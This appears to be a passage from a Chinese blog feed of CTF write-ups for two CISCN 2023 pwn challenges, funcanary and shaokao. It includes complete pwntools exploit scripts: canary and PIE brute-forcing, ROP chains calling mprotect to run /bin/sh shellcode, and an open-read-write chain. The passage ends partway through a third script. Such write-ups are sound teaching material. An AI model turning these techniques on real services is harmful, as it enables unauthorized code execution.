可以推断，后门函数的真实地址为 <code>0xn231</code>，其中 <code>n</code> 就是需要爆破的值，取值范围在 <code>0 ~ 15</code></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/funcanary"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.106.84.217"</span><span class="token punctuation">,</span> <span class="token number">26433</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/funcanary"</span><span class="token punctuation">)</span><span class="token comment"># 爆破 canary</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        canary <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x70</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> canary        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 注意不能用 sendline，不能添加换行符，否则 canary 永远不正确</span>        s <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># b'welcome\n'</span>        s <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># b'*** stack smashing detected ***: terminated\n'</span>        <span class="token keyword">if</span> <span class="token string">b'stack smashing detected'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>            canary <span class="token operator">=</span> canary<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"成功找到第 "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 个字节"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">continue</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary："</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span><span class="token comment"># 爆破后门函数地址</span>address <span class="token operator">=</span> <span class="token string">b'\x31'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    address <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x10</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 构造 b'\xi2'，即 address = p64(0xi231)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x70</span> <span class="token operator">-</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> address    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 注意不能用 sendline，不能添加换行符</span>    s <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        address <span class="token operator">=</span> address<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">continue</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-funcanary8.png" alt="CISCN2023-funcanary8.png"></p><p>爆破出 canary：<code>b&#39;\x00&#125;&#123;\xa1K\xc8\xbf\xe5&#39;</code></p><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-funcanary7.png" alt="CISCN2023-funcanary7.png"></p><p>可以看到爆破出的地址为：<code>0xf231</code></p><p>执行后门函数的 <code>system(&quot;/bin/cat flag&quot;)</code> 获得 flag</p>]]></content>
    
    
    <summary type="html">第十六届 CISCN 国赛初赛的一道题，整个题都在爆破，主要涉及 fork() 函数的 canary 爆破，以及利用 partial write 对 PIE 的地址爆破</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>【CISCN 2023】烧烤摊儿</title>
    <link href="https://www.4ss1du0us.cn/2023/06de7311e3.html"/>
    <id>https://www.4ss1du0us.cn/2023/06de7311e3.html</id>
    <published>2023-06-11T02:52:37.000Z</published>
    <updated>2023-07-01T03:08:43.053Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>通过 <code>scanf()</code> 输入的数据可以作为溢出点</mark></p></li><li><p><mark>使用 <code>ret2shellcode（mprotect 修改权限）</code>、<code>ORW</code>、<code>ret2syscall</code> 三种方法 get shell</mark></p></li></ul><hr><p><a href="https://ctf.ichunqiu.com/2023ciscn">（2023年5月27日-2023年5月28日）【CISCN 2023】烧烤摊儿</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>分析程序：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF1.png" alt="CISCN2023-烧烤摊儿1.png"><br>开启了金丝雀和栈不可执行</p></li><li><p>根据程序运行时的输出，在 IDA 下分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF2.png" alt="CISCN2023-烧烤摊儿2.png"><br>其中，目录 <code>menu()</code> 的输出为：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF3.png" alt="CISCN2023-烧烤摊儿3.png"><br>查看各个目录项的功能<br>① <code>pijiu()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF4.png" alt="CISCN2023-烧烤摊儿4.png"><br>② <code>chuan()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF5.png" alt="CISCN2023-烧烤摊儿5.png"><br>③ <code>yue()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF6.png" alt="CISCN2023-烧烤摊儿6.png"><br>④ <code>vip()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF7.png" alt="CISCN2023-烧烤摊儿7.png"><br>⑤ <code>gaiming()</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF8.png" alt="CISCN2023-烧烤摊儿8.png"></p></li><li><p>发现在 <code>gaiming()</code> 函数中，有将用户的输入 <code>v5</code> 赋值给全局变量 <code>name</code> 的操作<br>同时没有对 <code>v5</code> 的长度进行限制，存在栈溢出漏洞<br>需覆盖 0x28 个数据到达返回地址处：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF15.png" alt="CISCN2023-烧烤摊儿15.png"><br>跟进发现全局变量 <code>name</code> 在 .data 段上：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF9.png" alt="CISCN2023-烧烤摊儿9.png"><br>于是考虑将 shellcode 写到这里<br>用 gdb 查看权限：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF10.png" alt="CISCN2023-烧烤摊儿10.png"><br>全局变量 <code>name</code> 的地址 <code>0x4E60F0</code> 在 <code>0x4e6000 ~ 0x4e9000</code> 之间，Perm 为 <code>rw-p</code> 没有执行权限<br>但考虑到程序中有 <code>mprotect()</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF11.png" alt="CISCN2023-烧烤摊儿11.png"><br>可以用 <code>mprotect()</code> 函数为该段地址增加执行权限<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF12.png" alt="CISCN2023-烧烤摊儿12.png"><br><code>mprotect()</code> 函数的起始地址为 <code>0x458b00</code></p></li><li><p>使用 <code>ROPgadget --binary shaokao --only &#39;pop|ret&#39; | grep &#39;pop&#39;</code> 搜索可利用的 ROP：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF13.png" alt="CISCN2023-烧烤摊儿13.png"><br><code>mprotect()</code> 需要三个参数，分别是：<br>① RDI：要修改的内存页首地址（我这里将 <code>0x4e6000 ~ 0x4e9000</code> 这段地址全部改为 rwx 权限）<br>② RSI：要修改的内存页大小（我这里段长度为 0x3000）<br>③ RDX：要修改的权限（其中 r : 4，w : 2，x : 1，因此 rwx 为 4 + 2 + 1 &#x3D; 7）<br>同时，获取返回地址 <code>ret</code> 的地址：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF14.png" alt="CISCN2023-烧烤摊儿14.png"></p></li><li><p>经过分析可知，要想执行 <code>gaiming()</code> 中的栈溢出漏洞，首先要让 <code>own = 1</code>，只有在 <code>vip()</code> 中可以修改 <code>own</code> 的值为 1<br>首先需要买下摊位，要求余额 <code>money &gt; 100000</code>，而 <code>money</code> 的初始值为 233<br>发现在购买逻辑中存在漏洞：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF17.png" alt="CISCN2023-烧烤摊儿17.png"><br>当 <code>v9</code> 为负数时，可以让 <code>money</code> 增长，超过 100000 即可</p></li><li><p>因此，思路如下：<br>① 首先通过购买的逻辑漏洞使余额 <code>money &gt; 100000</code>，买下摊位，进入 <code>gaiming()</code> 函数<br>② 然后利用 <code>mprotect()</code> 函数给 <code>name</code> 所在的 .data 段增加执行权限<br>③ 最后通过 <code>j_strcpy_ifunc(&amp;name, v5)</code> 向 <code>name</code> 中写入 shellcode，并溢出 <code>v5</code> 执行 shellcode</p></li></ol><hr><h2 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.107.137.13"</span><span class="token punctuation">,</span> <span class="token number">20341</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx_addr <span class="token operator">=</span> <span class="token number">0x4a404b</span>ret_addr <span class="token operator">=</span> <span class="token number">0x40101a</span>mprotect_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>  <span class="token comment"># 0x458b00</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>  <span class="token comment"># 0x401B45</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4E6000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 布置mprotect()函数的参数</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mprotect_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>  <span class="token comment"># 跳转到mprotect()函数后返回到main()函数</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span>payload <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 补齐0x28个填充数据到达返回地址处</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>  <span class="token comment"># 跳转到shellcode处执行</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果一"><a href="#结果一" class="headerlink" title="结果一"></a>结果一</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF16.png" alt="CISCN2023-烧烤摊儿16.png"></p><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>在思路一中买下摊位执行  <code>gaiming()</code> 函数后<br>由于程序中包含 <code>open64()</code>、<code>read()</code>、<code>write()</code> 函数<br>因此还可以利用 <code>v5</code> 的溢出使用 ORW 读出 flag</p></li><li><p>确定 ORW 三个函数的地址：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF18.png" alt="CISCN2023-烧烤摊儿18.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF19.png" alt="CISCN2023-烧烤摊儿19.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF20.png" alt="CISCN2023-烧烤摊儿20.png"><br><code>open64()</code> 地址：<code>0x457C90</code><br><code>read()</code> 地址：<code>0x457DC0</code><br><code>write()</code> 地址：<code>0x457E60</code></p></li><li><p>首先需要通过 <code>j_strcpy_ifunc(&amp;name, v5)</code> 向 <code>name</code> 中写入 <code>b&#39;./flag\x00\x00&#39;</code>，并将 <code>b&#39;./flag\x00\x00&#39;</code> 作为 <code>open64()</code> 函数的参数，构造 <code>open(b&#39;./flag\x00\x00&#39;, 0)</code> 用于打开当前目录下名为 flag 的文件，其中 0 表示只读方式打开</p></li><li><p>然后构造 <code>read(3, name_addr, 0x50)</code> 将 flag 内容写入到 <code>name</code> 的地址处，再通过构造 <code>write(1, name_addr, 0x50)</code> 将 flag 内容从 <code>name</code> 的地址处输出到终端</p></li></ol><hr><h2 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.107.137.13"</span><span class="token punctuation">,</span> <span class="token number">20341</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/shaokao"</span><span class="token punctuation">)</span>open64_addr <span class="token operator">=</span> <span class="token number">0x457C90</span>read_addr <span class="token operator">=</span> <span class="token number">0x457DC0</span>write_addr <span class="token operator">=</span> <span class="token number">0x457E60</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx_addr <span class="token operator">=</span> <span class="token number">0x4a404b</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-100000000"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span><span class="token comment"># open(b'./flag\x00\x00', 0)</span>ORW <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open64_addr<span class="token punctuation">)</span><span class="token comment"># read(3, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token comment"># write(1, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'./flag\x00\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 向 name_addr 处填入b'./flag\x00\x00' 并补齐 8 字节，将长度填充到 0x28 至返回地址处</span>payload <span class="token operator">+=</span> ORWio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果二"><a href="#结果二" class="headerlink" title="结果二"></a>结果二</h2><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF21.png" alt="CISCN2023-烧烤摊儿21.png"></p><hr><h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><ol><li><p>在思路一中买下摊位执行  <code>gaiming()</code> 函数后<br>由于程序没有给出 libc 文件，并且可以向 <code>name</code> 所在的 <code>.data</code> 段写入数据<br>因此可以考虑向 <code>.data</code> 段上写入 <code>&quot;/bin/sh&quot;</code><br>但程序中没有 <code>system()</code> 函数，可以考虑使用 ret2syscall 构造 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 来 get shell</p></li><li><p>首先确定程序中存在 <code>pop rax ; ret</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF22.png" alt="CISCN2023-烧烤摊儿22.png"><br>还要存在 <code>syscall</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF23.png" alt="CISCN2023-烧烤摊儿23.png"></p></li><li><p>首先需要通过 <code>j_strcpy_ifunc(&amp;name, v5)</code> 向 <code>name</code> 中写入 <code>b&#39;/bin/sh\x00&#39;</code>，并溢出 <code>v5</code> 构造 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 执行</p></li><li><p>注意这里是将 <code>b&#39;/bin/sh\x00&#39;</code> 写入到 <code>name</code>，所以只能一次性 get shell<br>如果分两次的话，例如：第一次写入 <code>b&#39;/bin/sh\x00&#39;</code>，第二次执行 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，则在第二次中执行 <code>j_strcpy_ifunc(&amp;name, v5)</code> 又会将 <code>name</code> 覆盖掉，导致 get shell 失败</p></li></ol><hr><h2 id="脚本三"><a href="#脚本三" class="headerlink" title="脚本三"></a>脚本三</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span 